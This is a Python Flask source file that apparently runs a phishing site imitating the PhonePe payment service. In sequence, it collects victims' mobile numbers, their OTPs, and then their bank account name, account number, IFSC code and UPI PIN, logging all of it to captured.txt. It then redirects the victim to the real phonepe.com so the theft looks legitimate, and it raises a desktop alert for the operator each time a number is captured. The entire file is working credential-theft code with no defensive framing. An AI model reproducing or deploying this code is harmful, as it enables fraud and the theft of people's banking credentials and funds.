from flask import Flask, request, render_template, redirect
from threading import Thread
import time, re
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from plyer import notification

app = Flask(__name__)

# --- Notifier Setup ---
def notify(title, message):
    notification.notify(
        title=title,
        message=message,
        timeout=5
    )

class CapturedHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if event.src_path.endswith("captured.txt"):
            with open("captured.txt", "r") as f:
                lines = f.readlines()
            for line in reversed(lines):
                if "[LOGIN]" in line:
                    match = re.search(r'Mobile:\s*(\d+)', line)
                    if match:
                        mobile = match.group(1)
                        notify("ALERT: Mobile Captured", f"Mobile: {mobile}")
                        print(f"[NOTIFIED] Mobile Captured: {mobile}")
                    break

def start_notifier():
    observer = Observer()
    handler = CapturedHandler()
    observer.schedule(handler, path='.', recursive=False)
    observer.start()
    print("[AI] Notifier running...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# --- Flask Routes ---
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    mobile = request.form.get('mobile')
    with open('captured.txt', 'a') as f:
        f.write(f'[LOGIN] Mobile: {mobile}\n')
    return redirect(f'/otp?mobile={mobile}')

@app.route('/otp')
def otp():
    mobile = request.args.get('mobile')
    return render_template('otp.html', mobile=mobile)

@app.route('/verify', methods=['POST'])
def verify():
    otp = request.form.get('otp')
    mobile = request.form.get('mobile')
    with open('captured.txt', 'a') as f:
        f.write(f'[OTP] Mobile: {mobile}, OTP: {otp}\n')
    return render_template('processing.html', mobile=mobile)

@app.route('/account')
def account():
    mobile = request.args.get('mobile')
    return render_template('account.html', mobile=mobile)

@app.route('/submit_account', methods=['POST'])
def submit_account():
    name = request.form.get('name')
    acc_num = request.form.get('acc_num')
    ifsc = request.form.get('ifsc')
    upi_pin = request.form.get('upi_pin')
    with open('captured.txt', 'a') as f:
        f.write(f'[ACCOUNT] {name}, {acc_num}, {ifsc}, PIN: {upi_pin}\n')
    return redirect('https://www.phonepe.com')

# --- Start Server and Notifier Thread ---
if __name__ == '__main__':
    Thread(target=start_notifier, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
